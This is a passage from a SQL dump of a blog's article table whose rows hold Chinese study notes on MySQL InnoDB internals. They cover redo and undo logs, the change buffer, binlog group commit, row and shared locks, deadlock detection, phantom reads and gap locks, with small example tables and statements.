block去写入。\nredo log block写满之后，会在某个时机刷入到磁盘里去。\nredo log buffer里的redo log block什么时候可以刷入到磁盘文件里\n(1) 如果写入redo log buffer的日志已经占据了redo log buffer总容量的一半了，也就是超过了8MB的redo log在缓冲里了，此时就会把他们刷入到磁盘文件里去\n(2)后台线程定时刷新，有一个后台线程每隔1秒就会把redo log buffer里的redo log block刷到磁盘文件里去\n(3)一个事务提交的时候，必须把他的那些redo log所在的redo log block都刷入到磁盘文件里去，只有这样，当事务提交之后，他修改的数据绝对不会丢失，因为redo log里有重做日志，随时可以恢复事务做的修改\n(4)并行的事务提交的时候，顺带将这个事务的 redo log buffer 持久化到磁盘。\n假设一个事务 A 执行到一半，已经写了一些 redo log 到 buffer 中，这时候有另外一个线程的事务 B 提交，如果 innodb_flush_log_at_trx_commit 设置的是 1，那么按照这个参数的逻辑，事务 B 要把 redo log buffer 里的日志全部持久化到磁盘。\n这时候，就会带上事务 A 在 redo log buffer 里的日志一起持久化到磁盘，这叫做\"组提交\"。\n事务执行中间过程的 redo log 也是直接写在 redo log buffer的block 中的,这些 redo log 也可能会被后台线程一起持久化到磁盘。\n也就是说，一个没有提交的事务的 redo log，也是可能已经持久化到磁盘的。\n(5)MySQL关闭的时候，redo log block都会刷入到磁盘里去。\n```\n#### change buffer\n```java\n// 缓存更新数据\nchange buffer容易和redo log buffer弄混,change buffer是一个更新时用到的写缓冲区\n当需要更新一个数据页时，如果数据页在内存中就直接更新。\n但如果这个数据页还没有在内存中的话，在不影响数据一致性的前提下。\nInnoDB 会将这些更新操作缓存在 change buffer 中，这样就不需要从磁盘中读入这个数据页。\n在下次查询需要访问这个数据页的时候，将数据页读入内存，然后执行 change buffer 中与这个页有关的操作。\n通过这种方式就能保证这个数据逻辑的正确性。\n\n// 例子\n假设要更新两个数据页数据,Page1与Page2\nPage1在内存中,Page2不在内存中\n那么更新语句会做如下操作\n(1) Page 1 在内存中，直接更新内存；\n(2) Page 2 没有在内存中，就在内存的 change buffer 区域，记录\"我要往 Page 2 插入一行\"这个信息\n(3) redo log 将数据页改动和change buffer改动这两个动作记录下来\n做完上面这些，事务就可以完成了。\n执行这条更新语句的成本很低，写了两处内存，然后写了一处redo log的磁盘操作\n之后的读请求操作\n(1) 读 Page 1 时，直接从内存返回。\n(2) 读 Page 2 时，需要把 Page 2 从磁盘读入内存中，然后应用 change buffer 里面的操作日志，生成一个正确的版本并返回结果\n\n// 可持久化\n虽然名字叫作 change buffer，实际上它是可以持久化的数据。\nchange buffer 在内存中有拷贝，也会被写入到磁盘上\nchangebuffer跟普通数据页一样也是可以存在磁盘里，区别在于changebuffer是在共享表空间ibdata1里\n\n// 宕机恢复\nchange buffer中分两部分，一部分是本次写入未写完的，一部分是已经写入完成的\n(1) 未写完的，此部分操作，还未写入redo log，因此事务还未提交，所以没影响\n(2) 已经写完成的，可以通过redo log来进行恢复\n\n// merge\n将 change buffer 中的操作应用到原数据页，得到最新结果的过程称为 \"merge\"。\n(1) 访问这个数据页会触发 merge\n(2) 后台线程会定期 merge。\n(3) 数据库正常关闭（shutdown）的过程中，也会执行 merge 操作。\n如果能够将更新操作先记录在 change buffer，减少读磁盘，语句的执行速度会得到明显的提升。\n数据读入内存是需要占用 buffer pool 的，所以这种方式还能够避免占用内存，提高内存利用率\n\n// 唯一索引不会使用change buffer\n对于唯一索引来说，所有的更新操作都要先判断这个操作是否违反唯一性约束。\n要插入 k=4 一个记录，就要先判断现在表中是否已经存在 k=4 的记录，\n这必须要将数据页读入内存才能判断。\n如果都已经读入到内存了，那直接更新内存会更快，就没必要使用 change buffer 了\n// 普通索引会使用change buffer\n如果要在表中插入一个新记录(1, 100)\n(1)第一种情况是，这个记录要更新的目标页在内存中\n	对于唯一索引来说，找到 3 和 5 之间的位置，判断到没有冲突，插入这个值，语句执行结束；\n	对于普通索引来说，找到 3 和 5 之间的位置，插入这个值，语句执行结束。\n普通索引和唯一索引对更新语句性能影响的差别，只是一个判断，只会耗费微小的 CPU 时间。\n(2) 另一种情况是这个记录要更新的目标页不在内存中\n	对于唯一索引来说，需要将数据页读入内存，判断到没有冲突，插入这个值，语句执行结束；\n	对于普通索引来说，则是将更新记录在 change buffer，语句执行就结束了。\n将数据从磁盘读入内存涉及随机 IO 的访问，是数据库里面成本最高的操作之一。\nchange buffer 因为减少了随机磁盘访问，所以对更新性能的提升是会很明显的。\n\n// change buffer优缺点\nchange buffer 只限于用在普通索引的场景下，而不适用于唯一索引\nmerge 的时候才是真正进行数据更新的时刻，而 change buffer 的主要目的就是将记录的变更动作缓存下来\n所以在一个数据页做 merge 之前，change buffer 记录的变更越多（也就是这个页面上要更新的次数越多），利用率越大收益就越大\n对于写多读少的业务场景，页面在写完以后马上被访问到的概率比较小,此时 change buffer 的使用效果最好。比如账单类、日志类的系统。\n但如果一个业务的更新模式是写入之后马上会做查询，那么即使满足了条件，将更新先记录在 change buffer，但之后由于马上要访问这个数据页，会立即触发 merge 过程。\n这样随机访问 IO 的次数不会减少，反而增加了 change buffer 的维护代价。\n所以，对于写多读多的场景，change buffer 反而起到了副作用\n在使用机械硬盘时，change buffer 这个机制的收效是非常显著的。\n当有一个类似历史数据的库，并且出于成本考虑用的是机械硬盘时，尽量使用普通索引,然后把 change buffer 尽量开大，以确保这个历史数据表的数据写入速度。\n\n// change buffer大小设置\nchange buffer 用的是 buffer pool 里的内存，因此不能无限增大。\nchange buffer 的大小，可以通过参数 innodb_change_buffer_max_size 来动态设置。\n这个参数设置为 50 的时候，表示 change buffer 的大小最多只能占用 buffer pool 的 50%\n\n```\n### 组提交机制\n![MysqlLSN组提交机制.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625411221_Mysql-LSN组提交机制.png)\n![Mysqlredolog两阶段提交组提交优化.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625411221_Mysql-redolog-两阶段提交-组提交优化.png)\n```java\n// 日志逻辑序列号（log sequence number，LSN）的概念\n了解组提交前,先了解一个LSN的概念\nLSN 是单调递增的，用来对应 redo log 的一个个写入点。\n每次写入长度为 length 的 redo log， LSN 的值就会加上 length。\nLSN 也会写到 InnoDB 的数据页中，来确保数据页不会被多次执行重复的 redo log。\n关于 LSN 和 redo log、checkpoint 的关系\n\n// 例子假设\n假设三个并发事务 (trx1, trx2, trx3) 在 prepare 阶段，都写完 redo log buffer，持久化到磁盘的过程.\n对应的 LSN 分别是 10、20 和 30。\n(1) trx1 是第一个到达的，会被选为这组的 leader；\n(2) trx1 要开始写盘的时候，这个组里面已经有了三个事务(trx1,trx2,trx3)，这时候最新的 LSN 变成了 30；\n(3) trx1 去写盘时，带的就是 LSN=30 以下的事务，因此等 trx1 返回时，所有 LSN 小于等于 30 的 redo log，都已经被持久化到磁盘；\n(4) 这样的话,trx2 和 trx3 就可以直接返回了。\n所以一次组提交里面，组员越多，节约磁盘 IOPS 的效果越好。\n但如果只有单线程压测，那就只能老老实实地一个事务对应一次持久化操作了。\n在并发更新场景下，第一个事务写完 redo log buffer 以后，接下来这个 fsync 越晚调用，组员可能越多，节约 IOPS 的效果就越好。\n\n// 两阶段提交采用组提交机制优化\n为了让一次 fsync 带的组员更多，MySQL 有一个很有趣的优化：拖时间。\n这个优化用在两阶段提交上,MySQL 为了让组提交的效果更好。\n把 redo log 做 fsync 的拖到了binlog write后\n这么一来，binlog 也可以组提交了,当binlog fsync 到磁盘时，如果有多个事务的 binlog 已经 write 了，也是一起持久化的\n如果想提升 binlog 组提交的效果，可以通过设置 binlog_group_commit_sync_delay 和 binlog_group_commit_sync_no_delay_count 来实现。\n(1) binlog_group_commit_sync_delay 参数，表示延迟多少微秒后才调用 fsync;\n(2) binlog_group_commit_sync_no_delay_count 参数，表示累积多少次以后才调用 fsync。\n这两个参数条件是或的关系，也就是说只要有一个满足条件就会调用 fsync\n所以，当 binlog_group_commit_sync_delay 设置为 0 的时候，binlog_group_commit_sync_no_delay_count 也无效了。\n\n这样就了解WAL机制得益于两个方面\n(1) redo log 和 binlog 都是顺序写，磁盘的顺序写比随机写速度要快\n(2) 组提交机制，可以大幅度降低磁盘的 IOPS 消耗。\n\n// 参数的影响\n(1) 设置 binlog_group_commit_sync_delay 和 binlog_group_commit_sync_no_delay_count 参数，减少 binlog 的写盘次数。\n这个方法是基于“额外的故意等待”来实现的，因此可能会增加语句的响应时间，但没有丢失数据的风险。\n(2) 将 sync_binlog 设置为大于 1 的值。\n这样做的风险是，主机掉电时会丢 bin log 日志,也会丢失数据。\n当前崩溃恢复后,redo log查找数据完整的bing log日志,查找不到就会导致事务回滚,造成数据丢失\n(3) 将 innodb_flush_log_at_trx_commit 设置为 0 或 2。\n这样做的风险是，主机掉电的时候会丢数据或机器系统宕机会丢数据。\n把参数设置成 0，表示 redo log 只保存在内存中，这样的话 MySQL 本身异常重启会丢数据，风险太大。\n把参数设置成 2, 表示写到文件系统的 page cache,但是机器系统宕机也会丢失数据,不过相比设置为0,风险更小\n\n```\n### bin log\n#### bin log cache\n![Mysqlbinlogcache.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625411468_Mysql-binlogcache.png)\n```java\nbinlog是Server层的日志,是所有存储引擎都可以使用的日志\nbinlog 是追加写入的。追加写是指 binlog 文件写到一定大小后会切换到下一个，并不会覆盖以前的日志\nbinlog记录有三种模式\n(1) statement 格式记录sql语句\n(2) row格式会记录行的内容，记两条，更新前和更新后都有\n(3) mixed: 混合模式,用于mysql集群中数据同步使用\n\n// binlog的写入机制\nbinlog 的写入逻辑比较简单\n事务执行过程中，先把日志写到 binlog cache\n事务提交的时候，再把 binlog cache 写到 binlog 文件中。\n一个事务的 binlog 是不能被拆开的，不论这个事务多大，也要确保一次性写入。\n系统给 binlog cache 分配了一片内存，每个线程一个\n参数 binlog_cache_size 用于控制单个线程内 binlog cache 所占内存的大小。如果超过了这个参数规定的大小，就要暂存到磁盘。\n事务提交的时候，执行器会把 binlog cache 里的完整事务写入到 binlog 中，并清空 binlog cache。\n每个线程有自己 binlog cache，但是共用同一份 binlog 文件。\n// write和fsync\nwrite： 指的是把日志写入到操作系统的 page cache，并没有把数据持久化到磁盘，所以速度比较快。\nfsync： 这才是将数据持久化到磁盘的操作。一般情况下，我们认为 fsync 才占磁盘的 IOPS。\nwrite 和 fsync 的时机，是由参数 sync_binlog 控制的\n(1)sync_binlog=0 的时候，表示每次提交事务都只 write，不 fsync；\n(2)sync_binlog=1 的时候，表示每次提交事务都会执行 fsync；\n(3)sync_binlog=N(N>1) 的时候，表示每次提交事务都 write，但累积 N 个事务后才 fsync。\n出现 IO 瓶颈的场景里，将 sync_binlog 设置成一个比较大的值，可以提升性能。\n际的业务场景中，考虑到丢失日志量的可控性，一般不建议将这个参数设成 0，比较常见的是将其设置为 100~1000 中的某个数值。\n但是将 sync_binlog 设置为 N，对应的风险是：如果主机发生异常重启，会丢失最近 N 个事务的 binlog 日志。\n```\n#### binlog恢复数据\n```java\n// binlog恢复数据\nbinlog 会记录所有的逻辑操作，并且是采用“追加写”的形式,是归档的全量备份。\n当需要恢复数据到指定的某一秒时，比如某天下午四点发现下午两点有一次误删表，需要找回数据，可以这么做：\n	(1) 首先找到最近的一次全量备份\n	(2) 然后从备份的时间点开始，将备份的 binlog 依次取出来，重放到中午误删表之前的那个时刻。\n这样临时库就和误删前的库一样了，然后把表数据从临时库取出来，按需要恢复到当前时间的库去\n\n// binlog\nbinlog不能支持mysql崩溃后的重启恢复,因为它只仅仅记录了sql或变化值,没有记录数据页没有记录数据页实际的物理变化\n\n```\n### undo log\n```java\n假设万一在一个事务里的一通增删改操作执行到了一半，结果就回滚事务了该怎么办\n比如一个事务里有4个增删改操作，结果目前为止已经执行了2个增删改SQL了，已经更新了一些buffer pool里的数据了，\n但是还有2个增删改SQL的逻辑还没执行，此时事务要回滚了怎么办\n怎么回滚？毕竟无论是插入，还是更新，还是删除，该做的都已经做了啊！\n所以在执行事务的时候，必须引入另外一种日志，就是undo log回滚日志\n这个回滚日志，记录的东西其实非常简单，比如你要是在缓存页里执行了一个insert语句。\n那么此时你在undo log日志里，对这个操作记录的回滚日志就必须是有一个主键和一个对应的delete操作，要能让你把这次insert操作给回退了。\n比如说你执行的是delete语句，那么起码要把你删除的那条数据记录下来，如果要回滚，就应该执行一个insert操作把那条数据插入回去。\n这个undo log日志是至关重要的，没有它根本都没办法回滚事务\n\n// undo log日志文件格式\nINSERT语句的undo log的类型是TRX_UNDO_INSERT_REC，这个undo log里包含了以下一些东西：\n(1) 这条日志的开始位置: 日志的开始位置\n(2) 主键的各列长度和值: 写入时主键的id,若没有,则使用mysql默认提供的row_id\n(3) 表id: 表的id\n(4) undo log日志编号: 每个undo log都有自己的编号,一个事务里会有多个SQL语句，就会有多个undo log日志，在每个事务里的undo log日志的编号都是从0开始的，然后依次递增\n(5) undo log日志类型: TRX_UNDO_INSERT_REC，insert语句的undo log日志类型就是这个东西\n(6) 这条日志的结束位置: 日志的结束位置\n\n在buffer pool的一个缓存页里插入了一条数据，执行了insert语句，然后写了一条上面的那种undo log。\n现在事务要是回滚了，直接就把这条insert语句的undo log拿出来。\n然后在undo log里就知道在哪个表里插入的数据，主键是什么，直接定位到那个表和主键对应的缓存页，从里面删除掉之前insert语句插入进去的数据就可以了，这样就可以实现事务回滚的效果。\n\n```', 0, 0, 262, 0, 0, '2021-04-16 14:08:55', '2021-04-24 14:08:55', 0, 0);
INSERT INTO `article` VALUES (113, 1, 'mysql的锁', '2018/8/1535197673_0072Vf1pgy1foxk3qdi4cj31kw0w0kh2.jpg', '### 行锁\n#### 脏写\n![Mysql锁脏写.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625838917_Mysql-锁-脏写.png)\n![Mysql锁脏写2.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625838917_Mysql-锁-脏写2.png)\n```java\n// 脏写\n两个事务，事务A和事务B同时在更新一条数据。\n事务A先把他更新为A值，事务B紧接着就把他更新为B值。\n事务A更新后会记录一条undo log日志，在事务A更新前，这行数据的值为NULL。\n事务B是后更新那行数据的值，所以此时那行数据的最新值是B值。\n但是此时事务A突然出现错误需要进行回滚了，那么就会用他的undo log日志去回滚。\n但此时事务A一回滚，直接就会把那行数据的值更新回之前的NULL值。\n所以此时事务A回滚了，可能看起来这行数据的值就是NULL了。\n结果事务B更新的值B没了,就因为事务A回滚了就把数据值回滚成NULL了，使的事务B更新的值B也没了。\n所以对于事务B看到的场景，就是自己明明更新了，结果值却没了。\n所谓的脏写，就是我刚才明明写了一个数据值，结果过了一会儿却没了,真是莫名其妙。\n这个例子本质就是事务B去修改了事务A修改过的值，但是此时事务A还没提交，所以事务A随时会回滚，导致事务B修改的值也没了，这就是脏写的定义。\n\n```\n#### 锁机制\n![Mysql锁行锁机制.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625841804_Mysql-锁-行锁机制.png)\n![Mysql锁行锁机制2.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625841804_Mysql-锁-行锁机制2.png)\n```java\n脏写是绝对不允许的，所以需要依靠锁机制\n依靠锁机制可以让多个事务更新一行数据的时候串行化，避免同时更新一行数据。\n\n// 行锁\n顾名思义，行锁就是针对数据表中行记录的锁。\nMySQL 的行锁是在引擎层由各个引擎自己实现的,并不是所有的引擎都支持行锁，比如 MyISAM 引擎就不支持行锁\n不支持行锁意味着并发控制只能使用表锁，对于这种引擎的表，同一张表上任何时刻只能有一个更新在执行，这就会影响到业务并发度\n使用行锁指的是比如事务 A 更新了一行，而这时候事务 B 也要更新同一行，则必须等事务 A 的操作完成后才能进行更新\n\n// 例子\n假设有一行数据,有一个事务A来了要更新这行数据。\n事务A会先判断一下这行数据此时有没有人加锁。\n事务A一看没其他事务加锁,说明他是第一个人,捷足先登。\n此时这个事务A就会创建一个锁，里面包含了自己的trx_id和等待状态，然后把锁跟这行数据关联在一起。\n更新一行数据前,必须把数据所在的数据页从磁盘文件里读取到缓存页里来才能更新的，所以说，此时这行数据和关联的锁数据结构，都是在内存里的。\n\n图中因为事务A给那行数据加了锁，所以此时就可以说那行数据已经被加锁了,那么既然被加锁了，此时就不能再让别人访问\n现在有另外一个事务B过来了，这个事务B就也想更新那行数据，此时就会检查一下，当前这行数据有没有别人加锁\n事务B会发现事务A居然抢先给这行数据加锁了。\n事务B这个时候也会加个锁，然后排队等着，这个时候事务B也会生成一个锁数据结构，里面有他的trx_id，还有自己的等待状态。\n因为事务B是在排队等待，所以他的等待状态是true，意思是我在等着呢。\n\n过了一会,事务A更新完了数据，就会把自己的锁给释放掉了。\n锁一旦释放了，就会去找此时还有没有别的事务也对这行数据加锁了,于是他会发现事务B也加锁了\n于是就会把事务B的锁里的等待状态修改为false，然后唤醒事务B继续执行，此时事务B就获取到锁了。\n\n```\n#### 共享锁与独占锁\n```java\n多个事务运行的时候，他们加的是什么锁\n// X锁: 独占锁\n当有一个事务加了独占锁之后，此时其他事务再要更新这行数据，都是要加独占锁的，但是只能生成独占锁在后面等待。\n有事务在更新数据的时候，其他的事务因为默认就是开启mvcc机制的,所以其他事务依然可以读取这行数据。\n其他事务读取数据，完全可以根据自己的ReadView，去在undo log版本链条里找一个能读取的版本，完全不用去顾虑别人在不在更新。\n也就是说，对一行数据的读和写两个操作默认是不会加锁互斥的，因为MySQL的mvcc机制解决了这个问题，避免频繁加锁互斥。\n\n// S锁: 共享锁\n假设万一要在执行查询操作的时候想要加锁\nMySQL支持一种共享锁，S锁，这个共享锁的语法如下：\nselect * from table lock in share mode\n在一个查询语句后面加上lock in share mode，意思就是查询的时候对一行数据加共享锁。\n此时如果有别的事务在更新这行数据，已经加了独占锁了，此时你的共享锁就不能加了,只能等待,共享锁和独占锁是互斥的。\n如果在加共享锁的时候，其他事务也加共享锁,此时是可以的加锁的，你们俩事务都是可以加共享锁的，共享锁和共享锁是不会互斥的。\n\n更新数据的时候必然加独占锁，独占锁和独占锁是互斥的，此时别人不能更新；\n但此时要查询，默认是不加锁的，走mvcc机制读快照版本。\n但是查询是可以手动加共享锁的，共享锁和独占锁是互斥的，但是共享锁和共享锁是不互斥的，如下规律。\n锁类型        独占锁      共享锁\n独占锁        互斥        互斥\n共享锁        互斥        不互斥\n\n// 注意事项\n// lock in share mode因为覆盖索引,所以可能不会锁在主键索引上\n锁是加在索引上的,如果查询只需要通过索引找到id,没有回表\n那么 lock in share mode 会只锁在覆盖索引上,没有锁在主键索引上,所以实际上其他事务是可以改主键索引中的字段值的\n但是如果是 for update 就不一样了。 执行 for update 时，系统会认为你接下来要更新数据，因此会顺便给主键索引上满足条件的行加上行锁。\n所以如果你要用 lock in share mode 来给行加读锁避免数据被更新的话，就必须得绕过覆盖索引的优化，在查询字段中加入索引中不存在的字段。\n\n一般开发业务系统的时候，不会在数据库层面做复杂的手动加锁操作。\n反而会用基于redis/zookeeper的分布式锁来控制业务系统的锁逻辑。\n因为如果把分布式系统里的复杂业务的一些锁机制依托数据库查询的时候，在SQL语句里加共享锁或者独占锁，会导致这个加锁逻辑隐藏在SQL语句里。\n在业务系统层面其实是非常的不好维护的，所以一般是不建议这么做的。\n```\n#### 两阶段锁协议\n```java\n// 两阶段锁协议\n在 InnoDB 事务中，行锁是在需要的时候才加上的，但并不是不需要了就立刻释放，而是要等到事务结束时才释放。\n如果你的事务中需要锁多个行，要把最可能造成锁冲突、最可能影响并发度的锁尽量往后放\n比如顾客A要在商家A购买物品。这个业务需要涉及到以下操作\n(1) 从顾客A账户余额中扣除物品价格；\n(2) 给商家A的账户余额增加这个物品的价格\n(3) 记录一条交易日志\n要完成这个交易，我们需要 update 两条记录，并 insert 一条记录\n如果同时有另外一个顾客B要在商家A买东西，那么这两个事务冲突的部分就是语句 2 了。\n因为它们要更新同一个商家账户的余额，需要修改同一行数据。\n按照3、1、2 这样的顺序，商家账户余额这一行的锁时间就最少。\n这就最大程度地减少了事务之间的锁等待，提升了并发度。\n\n// 注意事项\n// 读提交隔离级别会提前释放行锁\n读提交隔离级别语句执行过程中加上的行锁,在语句执行完成后,就要把\"不满足条件的行\"的行锁直接释放了,不需要等到事务提交\n\n```\n#### 死锁和死锁检测\n```java\n当并发系统中不同线程出现循环资源依赖，涉及的线程都在等待别的线程释放资源时，就会导致这几个线程都进入无限等待的状态，称为死锁\n比如事务 A 在等待事务 B 释放 id=2 的行锁，而事务 B 在等待事务 A 释放 id=1 的行锁。\n事务 A 和事务 B 在互相等待对方的资源释放，就是进入了死锁状态\n出现死锁以后，有两种策略解决\n(1) 进入等待直到超时。这个超时时间可以通过参数 innodb_lock_wait_timeout 来设置。\n(2) 发起死锁检测，发现死锁后，主动回滚死锁链条中的某一个事务，让其他事务得以继续执行。将参数 innodb_deadlock_detect 设置为 on，表示开启这个逻辑\n在 InnoDB 中，innodb_lock_wait_timeout 的默认值是 50s。\n意味着如果采用等待超时策略，当出现死锁后，第一个被锁住的线程要过 50s 才会超时退出，然后其他线程才有可能继续执行。\n对于在线服务来说，这个50s等待时间是无法接受的 \n但又不可能把这个时间设置成一个很小的值，比如 1s。这样当出现死锁的时候，确实很快就可以解开，但如果不是死锁，而是简单的锁等待,那么会造成误伤\n正常情况下我们还是要采用死锁检测策略,innodb_deadlock_detect 的默认值本身就是 on。\n主动死锁检测在发生死锁的时候，能够快速发现并进行处理的，但是它也是有额外负担的\n每个新来的被堵住的线程，都要判断会不会由于自己的加入导致了死锁\n假设有 1000 个并发线程要同时更新同一行，那么死锁检测操作就是 100 万这个量级\n死锁检测期间要消耗大量的 CPU 资源。因此CPU 利用率很高，但是每秒却执行不了几个事务\n可以考虑控制mysql的并发度来减少死锁检测的压力,但是这是很难的,需要懂得中间件或者修改mysql源码\n可以考虑通过将一行改成逻辑上的多行来减少锁冲突,将一行记录分成十行,总记录是十行的相加,这样就把锁冲突几率降低,但是业务复杂度可能会大幅度提高\nupdate 更新语句因为是当前读,事务会获取行锁,所以可能会导致死锁\nmysql的行锁非常难以使用和控制,所以业务系统尽量不要主动使用行锁,而是使用乐观锁或在事务前后采用分布式锁来实现并发控制\n\n由于锁是一个个加的,要避免死锁,对于同一组资源,要尽量按照相同的顺序访问\n在发生死锁的时刻,for update这条语句占有的资源更多,回滚成本更大,所以InnoDB选择了回滚成本更小的lock in share mode语句\n\n```\n### 间隙锁\n#### 幻读\n![Mysql幻读.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625472566_Mysql-幻读.png)\n```java\n了解间隙锁之前先了解幻读\n// 幻读引起的问题\n// 例子\nCREATE TABLE `t` (\n  `id` int(11) NOT NULL,\n  `a` int(11) DEFAULT NULL,\n  `b` int(11) DEFAULT NULL,\n  PRIMARY KEY (`id`),\n  KEY `a` (`a`)\n) ENGINE=InnoDB;\ninsert into t values(0,0,0),(5,5,5),\n(10,10,10),(15,15,15),(20,20,20),(25,25,25);\n\n这个表除了主键 id 外，还有一个普通索引 a，初始化语句在表中插入了 6 行数据。\n\nbegin;\nselect * from t where b=5 for update;\ncommit;\n这个语句会命中 b=5 的这一行，对应的那行主键 id=5。\n在 select 语句执行完成后，id=5 这一行会加一个写锁。\n而且由于两阶段锁协议，这个写锁在执行 commit 语句的时候才会释放。\n由于字段 b 上没有索引，因此这条查询语句会做全表扫描。\n所以其他被扫描到的行数，但不满足条件的那 5 行记录，会不会被加锁?\n\n// 如果只在 id=5 这一行加锁，而其他行的不加锁的话，会怎么样\nsession A 里执行了三次查询，分别是 Q1、Q2 和 Q3。\nSQL 语句都是 select * from t where b=5 for update\n查所有 b=5 的行，而且使用的是当前读，并且加上写锁\n结果如下\n(1) Q1 只返回 id=5 这一行\n(2) T2 时刻，session B 把 id=0 这一行的 b 值改成了 5\n(3) T3 时刻 Q2 查出来的是 id=0 和 id=5 这两行\n(4) T4 时刻，session C 插入一行（1,1,5）\n(5) T5 时刻 Q3 查出来的是 id=0、id=1 和 id=5 的这三行。\n\nQ3 读到 id=1 这一行的现象，被称为“幻读”。\n幻读指的是一个事务在前后两次查询同一个范围的时候，后一次查询看到了前一次查询没有看到的行。\n这三个查询都是加了 for update，都是当前读\n当前读的规则，就是能读到所有已经提交的记录的最新值。\n// 对“幻读”做一个说明：\n(1) 在可重复读隔离级别下，普通的查询是快照读，是不会看到别的事务插入的数据的。\n因此，幻读在“当前读”下才会出现。\n(2) session B 的修改结果，被 session A 之后的 select 语句用“当前读”看到，不能称为幻读。\n幻读仅专指“新插入的行”。\n\n```\n#### 幻读引起的问题-行锁失去语义\n![Mysql幻读行锁失去语义.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625472566_Mysql-幻读-行锁失去语义.png)\n```java\n// 行锁失去语义\nsession A 在 T1 时刻声明\"要把所有 b=5 的行锁住\",不允许别的事务进行读写操作”。 \n实际上,这个语义被破坏了\n修改一下例子,如果session B 和 session C 里面分别再加一条 SQL 语句，会出现什么现象。\n(1) session B 加上第二条语句 update t set a=5 where id=0。,那么意思是把 id=0、b=5 这一行的 a 值，改成了 5。\n(2) T1 时刻，session A 只是给 id=5 这一行加了行锁， 并没有给 id=0 这行加上锁。\n(3) 但session B 在 T2 时刻，是可以执行这两条 update 语句的。\n(4) 这样就破坏了 session A 里 Q1 语句要锁住所有 b=5 的行的加锁声明,sessionB擅自把一个 id=0 的 b 值改成了5\n(5) session C 也是一样的道理，对 id=1 这一行的修改，也破坏了 Q1 的加锁声明\n(6) sessionA 没有锁住 b = 5 的行,因为这些操作是sessionA加锁后,sessionB和sessionC把别的行的 b 值改成了 5\n\n```\n#### 幻读引起的问题-数据不一致\n![Mysql幻读数据不一致.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625472567_Mysql-幻读-数据不一致.png)\n```java\n// 数据一致性问题\n锁的设计是为了保证数据的一致性。\n这个一致性，不止是数据库内部数据状态在此刻的一致性，还包含了数据和日志在逻辑上的一致性。\n为了说明这个问题，给 session A 在 T1 时刻再加一个更新语句，即：update t set b=100 where b=5。\n执行完成后，数据库里会是什么结果\n(1) T1 时刻，id=5 这一行变成 (5,5,100)，当然,这个结果是在 T6 时刻正式提交的 ;\n(2) T2 时刻，id=0 这一行变成 (0,5,5);\n(3) T4 时刻，表里面多了一行 (1,5,5);\n\n这时候看 binlog 里面的内容。\n(1) T2 时刻，session B 事务提交，写入了两条语句；\n(2) T4 时刻，session C 事务提交，写入了两条语句；\n(3) T6 时刻，session A 事务提交，写入了 update t set b=100 where b=5 这条语句。\n统一放到一起的话，bin log里就是这样的\n\nupdate t set b=5 where id=0; /*(0,0,5)*/\nupdate t set a=5 where id=0; /*(0,5,5)*/\n\ninsert into t values(1,1,5); /*(1,1,5)*/\nupdate t set a=5 where id=1; /*(1,5,5)*/\n\nupdate t set b=100 where b=5;/*所有b=5的行，b改成100*/\n\n这三行的最终结果，变成了 (0,5,100)、(1,5,100)、(5,5,100)。\n这时id=0 和 id=1 这两行，发生了数据不一致。\nsessionA的提交事务,原本只想把id = 5的 b 值改成 100\n但是因为sessionB把id = 0的 b 值 改成 5, 所以sessionA提交后id = 0的 b 值也变成了100\n同理,sessionA插入一行 id = 1 ,b 值为 5, sessionA提交后也把id = 1的 b 值也变成了100\n\n```\n#### 锁住所有的扫描行也无法解决幻读\n![Mysql幻读锁住所有的扫描行.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625472567_Mysql-幻读-锁住所有的扫描行.png)\n```java\n前面说到 a 是加了索引的, b 是没有加索引的,所以 b 会全表扫描\n如果把扫描过程中碰到的行，也都加上写锁，再来看看执行效果\n\nsession A 把所有扫描到的行都加了写锁，所以 session B 在执行第一个 update 语句的时候就被锁住了。\n需要等到 T6 时刻 session A 提交以后，session B 才能继续执行。\n\n这样的话,在 binlog 里面，执行序列是这样的：\n\ninsert into t values(1,1,5); /*(1,1,5)*/\nupdate t set c=5 where id=1; /*(1,5,5)*/\n\nupdate t set d=100 where d=5;/*所有d=5的行，d改成100*/\n\nupdate t set d=5 where id=0; /*(0,0,5)*/\nupdate t set c=5 where id=0; /*(0,5,5)*/\n这三行的最终结果，变成了 (0,5,5)、(1,5,100)、(5,5,100)。\n按照日志顺序执行，id=0 这一行的最终结果是 (0,5,5)。所以，id=0 这一行的问题解决了。\n但同时也看到 id=1 这一行，binlog 的执行结果是 (1,5,100)。\n也就是说幻读的问题还是没有解决。\n把所有的记录都上了锁，还是阻止不了 id=1 这一行插入和更新。\n原因就在于,在 T3 时刻，给所有行加锁的时候，id=1 这一行还不存在，不存在也就加不上锁。\n也就是说，即使把所有的记录都加上锁，还是阻止不了新插入的记录，这也是为什么“幻读”会被单独拿出来解决的原因。\n```\n#### 间隙锁\n![Mysql间隙锁.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625472567_Mysql-间隙锁.png)\n```java\n// 如何解决幻读\n产生幻读的原因是，行锁只能锁住行，但是新插入记录这个动作，要更新的是记录之间的“间隙”。\n因此，为了解决幻读问题，InnoDB 只好引入新的锁，也就是间隙锁 (Gap Lock)。\n顾名思义，间隙锁，锁的就是两个值之间的空隙。\n比如表 t 初始化插入了 6 个记录，这就产生了 7 个间隙。\n这样的话，当你执行 select * from t where b=5 for update 的时候。\n就不止是给数据库中已有的 6 个记录加上了行锁，还同时加了 7 个间隙锁。这样就确保了无法再插入新的记录。\n也就是说这时候，在一行行扫描的过程中，不仅将给行加上了行锁，还给行两边的空隙，也加上了间隙锁。\n\n数据行是可以加上锁的实体，数据行之间的间隙，也是可以加上锁的实体。但是间隙锁跟我们之前碰到过的锁都不太一样。\n行锁，分成读锁和写锁。读锁与读锁不互斥,读锁与写锁互斥,写锁与写锁互斥\n但是间隙锁不一样，跟间隙锁存在冲突关系的，是“往这个间隙中插入一个记录”这个操作。间隙锁之间都不存在冲突关系。\n\n比如说,sessionA和sessionB都是查询表里a = 7的行。\n这里 session B 